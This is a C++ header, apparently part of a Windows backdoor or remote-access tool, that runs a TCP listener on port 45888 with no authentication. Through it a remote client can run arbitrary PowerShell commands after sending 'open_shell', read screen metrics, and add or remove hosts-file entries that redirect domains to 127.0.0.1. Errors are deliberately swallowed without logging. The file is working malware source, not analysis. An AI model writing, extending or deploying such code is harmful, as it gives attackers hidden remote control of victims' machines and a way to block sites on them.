#ifndef SERVER_HPP
#define SERVER_HPP

#define ASIO_STANDALONE

#include <winsock2.h>
#include <windows.h>
#include <asio.hpp>
#include <thread>
#include <fstream>
#include <atomic>
#include <vector>
#include <string>
#include <sstream>

namespace Comunicacion
{
    std::atomic<bool> ShellCheck{false};

    inline bool AgregarExclusion(std::string exclusion)
    {
        std::fstream ArchivoExclusiones("C:\\Windows\\System32\\drivers\\etc\\hosts", std::ios::app);
        if (ArchivoExclusiones.is_open())
        {
            ArchivoExclusiones << "127.0.0.1 " << exclusion << std::endl;
            ArchivoExclusiones.close();
            return true;
        }
        return false;
    }

    inline bool EliminarUltimaLinea()
    {
        std::ifstream inFile("C:\\Windows\\System32\\drivers\\etc\\hosts");
        if (!inFile.is_open())
            return false;
        std::vector<std::string> lineas;
        std::string linea;
        while (std::getline(inFile, linea))
        {
            lineas.push_back(linea);
        }
        inFile.close();

        if (lineas.empty())
            return false;
        lineas.pop_back();

        std::ofstream outFile("C:\\Windows\\System32\\drivers\\etc\\hosts", std::ios::trunc);
        if (!outFile.is_open())
            return false;
        for (const auto &l : lineas)
        {
            outFile << l << std::endl;
        }
        outFile.close();
        return true;
    }

    // Función que concatena múltiples strings y los envía
    template <typename... Args>
    void enviarMensaje(asio::ip::tcp::socket &sock, Args &&...args)
    {
        std::ostringstream oss;
        (oss << ... << args);
        std::string mensaje = oss.str();
        asio::write(sock, asio::buffer(mensaje));
    }

    inline bool PowerShell(const std::string &command, std::string &resultado)
    {
        STARTUPINFOA si{};
        PROCESS_INFORMATION pi{};
        SECURITY_ATTRIBUTES sa{sizeof(SECURITY_ATTRIBUTES), NULL, TRUE};

        si.cb = sizeof(si);
        si.dwFlags = STARTF_USESTDHANDLES;
        si.hStdInput = GetStdHandle(STD_INPUT_HANDLE);

        HANDLE hRead = nullptr, hWrite = nullptr;
        if (!CreatePipe(&hRead, &hWrite, &sa, 0))
            return false;

        si.hStdOutput = hWrite;
        si.hStdError = hWrite;

        std::string fullCmd = "powershell.exe -Command \"" + command + "\"";
        std::vector<char> cmdBuffer(fullCmd.begin(), fullCmd.end());
        cmdBuffer.push_back('\0');

        BOOL success = CreateProcessA(
            NULL, cmdBuffer.data(), NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);

        CloseHandle(hWrite);

        if (!success)
        {
            CloseHandle(hRead);
            return false;
        }

        char buffer[4096];
        DWORD bytesRead;
        while (ReadFile(hRead, buffer, sizeof(buffer), &bytesRead, NULL) && bytesRead > 0)
        {
            resultado.append(buffer, bytesRead);
        }

        CloseHandle(hRead);
        WaitForSingleObject(pi.hProcess, INFINITE);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);

        return true;
    }

    void manejarSesion(asio::ip::tcp::socket sock)
    {
        try
        {
            char data[4096];
            while (true)
            {
                std::size_t length = sock.read_some(asio::buffer(data));
                if (length == 0)
                    break;

                std::string mensaje(data, length);
                if (!mensaje.empty() && mensaje.back() == '\n')
                    mensaje.pop_back();

                if (mensaje.empty())
                {
                    enviarMensaje(sock, "Mensaje vacío, pibe...\n");
                    continue;
                }

                std::istringstream ss(mensaje);
                std::vector<std::string> Instrucciones;
                std::string instruccion;
                while (ss >> instruccion)
                {
                    Instrucciones.push_back(instruccion);
                }

                if (!ShellCheck.load())
                {
                    if (Instrucciones[0] == "open_shell")
                    {
                        ShellCheck.store(true);
                        enviarMensaje(sock, "Shell activado.\n");
                        continue;
                    }

                    if (Instrucciones[0] == "screen_info")
                    {
                        int width = GetSystemMetrics(SM_CXSCREEN);
                        int height = GetSystemMetrics(SM_CYSCREEN);
                        enviarMensaje(sock,
                                      " - - - - Informacion - - - - \n",
                                      " - Width: ", std::to_string(width), "\n",
                                      " - Height: ", std::to_string(height), "\n",
                                      " - - - - Informacion - - - - \n");
                        continue;
                    }

                    if (Instrucciones[0] == "exclusion")
                    {
                        if (Instrucciones.size() < 2)
                        {
                            enviarMensaje(sock, "Faltan parametros para exclusion\n");
                            continue;
                        }
                        if (Instrucciones[1] == "remove")
                        {
                            if (EliminarUltimaLinea())
                                enviarMensaje(sock, " - - Exclusion eliminada con exito - - \n");
                            else
                                enviarMensaje(sock, " - - No se pudo eliminar la exclusion - - \n");
                        }
                        else if (Instrucciones[1] == "add")
                        {
                            if (Instrucciones.size() < 3)
                            {
                                enviarMensaje(sock, "Faltan parametros para agregar exclusion\n");
                                continue;
                            }
                            if (AgregarExclusion(Instrucciones[2]))
                                enviarMensaje(sock, " - - Exclusion agregada con exito - - \n");
                            else
                                enviarMensaje(sock, " - - La exclusion no pudo ser agregada - - \n");
                        }
                        else
                        {
                            enviarMensaje(sock, " - - Operacion no valida - - \n");
                        }
                        continue;
                    }

                    enviarMensaje(sock, " - - Shell Desactivado - - \n");
                }
                else
                {
                    if (Instrucciones[0] == "close_shell")
                    {
                        ShellCheck.store(false);
                        enviarMensaje(sock, "Shell desactivado.\n");
                        continue;
                    }

                    std::string resultado;
                    if (PowerShell(mensaje, resultado))
                    {
                        enviarMensaje(sock,
                                      "\n - - - - - Inicio - - - - -\n",
                                      resultado,
                                      "\n - - - - - Final  - - - - -\n@bin> ");
                    }
                    else
                    {
                        enviarMensaje(sock, "Error ejecutando PowerShell\n@bin> ");
                    }
                }
            }
        }
        catch (const std::exception &)
        {
            // Ignorar errores, sin registrar nada.
        }
        sock.close();
    }

    void iniciarServidor()
    {
        try
        {
            asio::io_context io_context;
            asio::ip::tcp::acceptor acceptor(io_context, asio::ip::tcp::endpoint(asio::ip::tcp::v4(), 45888));

            while (true)
            {
                asio::ip::tcp::socket socket(io_context);
                acceptor.accept(socket);
                std::thread(manejarSesion, std::move(socket)).detach();
            }
        }
        catch (const std::exception &)
        {
            // Ignorar errores, sin registrar nada.
        }
    }

} // namespace Comunicacion

#endif // SERVER_HPP